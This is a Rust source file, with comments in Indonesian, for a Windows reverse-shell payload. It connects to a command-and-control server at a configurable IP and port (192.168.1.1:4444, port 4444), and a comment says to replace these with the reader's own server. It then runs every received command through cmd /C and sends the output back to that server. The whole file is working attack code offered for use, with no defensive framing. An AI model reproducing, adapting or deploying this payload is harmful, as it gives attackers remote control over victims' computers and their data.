// Manual compile: rustc --target=x86_64-pc-windows-gnu payload.rs
// Catatan: Kompilasi dengan target Windows GNU untuk menghasilkan file .exe yang berjalan pada sistem Windows.

use std::net::TcpStream; // Digunakan untuk membuat koneksi TCP ke server.
use std::io::{Read, Write}; // Digunakan untuk membaca dan menulis data melalui koneksi TCP.
use std::process::{Command, Stdio}; // Digunakan untuk menjalankan perintah sistem melalui shell.

fn main() {
    // Alamat IP dan port server C2 (Command and Control)
    // Ganti dengan alamat IP dan port server C2 Anda.
    let server_ip = "192.168.1.1";
    let server_port = "4444";

    // Membuat koneksi ke server C2
    let mut stream = match TcpStream::connect(format!("{}:{}", server_ip, server_port)) {
        Ok(stream) => stream, // Jika berhasil, lanjutkan dengan stream.
        Err(e) => {
            eprintln!("Failed to connect to the server: {}", e); // Jika gagal, cetak pesan kesalahan.
            return; // Keluar dari program jika koneksi gagal.
        }
    };

    // Memulai loop untuk menerima perintah dari server dan menjalankannya
    loop {
        // Buffer untuk menyimpan data perintah yang diterima dari server
        let mut command_buffer = [0; 512]; // Maksimal 512 byte untuk satu perintah.

        // Membaca data perintah dari server
        match stream.read(&mut command_buffer) {
            Ok(n) => {
                if n == 0 {
                    // Jika jumlah byte yang diterima adalah 0, berarti koneksi ditutup oleh server.
                    println!("Connection closed by the server.");
                    break; // Keluar dari loop.
                }
                // Mengonversi data perintah dari byte ke string
                let command = String::from_utf8_lossy(&command_buffer[..n]);
                println!("Received command: {}", command);

                // Menjalankan perintah menggunakan shell `cmd`
                let output = Command::new("cmd") // Memanggil Command Prompt di Windows.
                    .arg("/C") // Flag untuk menjalankan perintah lalu keluar.
                    .arg(command.trim()) // Menambahkan perintah yang diterima dari server.
                    .stdout(Stdio::piped()) // Mengalihkan output standar (stdout) ke program.
                    .stderr(Stdio::piped()) // Mengalihkan output kesalahan (stderr) ke program.
                    .output() // Menjalankan perintah dan menangkap hasilnya.
                    .expect("Failed to execute command."); // Jika terjadi kesalahan, cetak pesan.

                // Mengirimkan hasil output perintah kembali ke server
                stream.write_all(&output.stdout).expect("Failed to send output to server."); // Kirim hasil stdout.
                stream.write_all(&output.stderr).expect("Failed to send error output to server."); // Kirim hasil stderr.
            }
            Err(e) => {
                // Jika terjadi kesalahan saat membaca data dari server
                eprintln!("Failed to receive data from the server: {}", e);
                break; // Keluar dari loop.
            }
        }
    }
}
